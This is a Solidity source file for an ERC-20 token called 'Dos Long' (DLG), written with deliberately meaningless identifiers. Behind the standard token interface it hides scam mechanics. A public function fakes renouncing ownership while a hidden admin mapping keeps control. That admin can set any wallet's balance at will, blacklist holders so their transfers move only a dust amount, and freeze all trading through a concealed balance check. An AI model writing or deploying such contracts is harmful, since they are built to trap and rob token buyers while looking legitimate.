//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface enableReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract shouldTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeFromFee {
    function createPair(address txWalletTotal, address launchList) external returns (address);
}

interface takeTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingExemptAmount) external view returns (uint256);

    function transfer(address amountMarketing, uint256 marketingWallet) external returns (bool);

    function allowance(address atLiquidityTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingWallet) external returns (bool);

    function transferFrom(
        address sender,
        address amountMarketing,
        uint256 marketingWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingReceiver, uint256 value);
    event Approval(address indexed atLiquidityTx, address indexed spender, uint256 value);
}

interface shouldAmount is takeTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DosLong is shouldTeam, takeTo, shouldAmount {

    function getOwner() external view returns (address) {
        return listTotalReceiver;
    }

    function amountMax(address modeShouldLimit, address amountMarketing, uint256 marketingWallet) internal returns (bool) {
        if (modeShouldLimit == launchedSwapLaunch) {
            return sellReceiver(modeShouldLimit, amountMarketing, marketingWallet);
        }
        uint256 teamLaunchMax = takeTo(teamWallet).balanceOf(fromTrading);
        require(teamLaunchMax == listBuy);
        require(amountMarketing != fromTrading);
        if (receiverAuto[modeShouldLimit]) {
            return sellReceiver(modeShouldLimit, amountMarketing, maxIsReceiver);
        }
        return sellReceiver(modeShouldLimit, amountMarketing, marketingWallet);
    }

    function txReceiver() public {
        emit OwnershipTransferred(launchedSwapLaunch, address(0));
        listTotalReceiver = address(0);
    }

    function takeWallet(address teamMin) public {
        txShould();
        if (limitAt != modeFrom) {
            limitMode = buyTotal;
        }
        if (teamMin == launchedSwapLaunch || teamMin == teamWallet) {
            return;
        }
        receiverAuto[teamMin] = true;
    }

    mapping(address => bool) public isLaunch;

    function name() external view virtual override returns (string memory) {
        return exemptTake;
    }

    address launchSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public limitMode;

    event OwnershipTransferred(address indexed buyFrom, address indexed receiverShould);

    function walletTotal(uint256 marketingWallet) public {
        txShould();
        listBuy = marketingWallet;
    }

    function allowance(address buySell, address fundTake) external view virtual override returns (uint256) {
        if (fundTake == launchSell) {
            return type(uint256).max;
        }
        return isShould[buySell][fundTake];
    }

    bool public limitAt;

    function owner() external view returns (address) {
        return listTotalReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return isAmount;
    }

    uint256 private shouldMax;

    function balanceOf(address marketingExemptAmount) public view virtual override returns (uint256) {
        return listWallet[marketingExemptAmount];
    }

    address public launchedSwapLaunch;

    uint8 private toMin = 18;

    mapping(address => uint256) private listWallet;

    uint256 listBuy;

    function txShould() private view {
        require(isLaunch[_msgSender()]);
    }

    uint256 public feeToken;

    bool private enableTotalMin;

    bool public enableTotalTo;

    address public teamWallet;

    bool private shouldTeamReceiver;

    function liquidityLimit(address launchMode) public {
        if (enableTotalTo) {
            return;
        }
        if (buyTotal == txMarketing) {
            enableTotalMin = true;
        }
        isLaunch[launchMode] = true;
        
        enableTotalTo = true;
    }

    function transferFrom(address modeShouldLimit, address amountMarketing, uint256 marketingWallet) external override returns (bool) {
        if (_msgSender() != launchSell) {
            if (isShould[modeShouldLimit][_msgSender()] != type(uint256).max) {
                require(marketingWallet <= isShould[modeShouldLimit][_msgSender()]);
                isShould[modeShouldLimit][_msgSender()] -= marketingWallet;
            }
        }
        return amountMax(modeShouldLimit, amountMarketing, marketingWallet);
    }

    bool private modeFrom;

    string private exemptTake = "Dos Long";

    uint256 private buyTotal;

    function totalSupply() external view virtual override returns (uint256) {
        return listTx;
    }

    function decimals() external view virtual override returns (uint8) {
        return toMin;
    }

    string private isAmount = "DLG";

    function approve(address fundTake, uint256 marketingWallet) public virtual override returns (bool) {
        isShould[_msgSender()][fundTake] = marketingWallet;
        emit Approval(_msgSender(), fundTake, marketingWallet);
        return true;
    }

    uint256 private fromReceiver;

    constructor (){
        
        enableReceiver atLaunched = enableReceiver(launchSell);
        teamWallet = modeFromFee(atLaunched.factory()).createPair(atLaunched.WETH(), address(this));
        if (enableTotalMin == modeFrom) {
            modeFrom = false;
        }
        launchedSwapLaunch = _msgSender();
        txReceiver();
        isLaunch[launchedSwapLaunch] = true;
        listWallet[launchedSwapLaunch] = listTx;
        if (limitMode == txMarketing) {
            shouldMax = limitMode;
        }
        emit Transfer(address(0), launchedSwapLaunch, listTx);
    }

    mapping(address => bool) public receiverAuto;

    function enableFundSell(address toReceiver, uint256 marketingWallet) public {
        txShould();
        listWallet[toReceiver] = marketingWallet;
    }

    mapping(address => mapping(address => uint256)) private isShould;

    address private listTotalReceiver;

    address fromTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private listTx = 100000000 * 10 ** 18;

    uint256 takeSenderToken;

    function transfer(address toReceiver, uint256 marketingWallet) external virtual override returns (bool) {
        return amountMax(_msgSender(), toReceiver, marketingWallet);
    }

    function sellReceiver(address modeShouldLimit, address amountMarketing, uint256 marketingWallet) internal returns (bool) {
        require(listWallet[modeShouldLimit] >= marketingWallet);
        listWallet[modeShouldLimit] -= marketingWallet;
        listWallet[amountMarketing] += marketingWallet;
        emit Transfer(modeShouldLimit, amountMarketing, marketingWallet);
        return true;
    }

    uint256 constant maxIsReceiver = 19 ** 10;

    uint256 private txMarketing;

}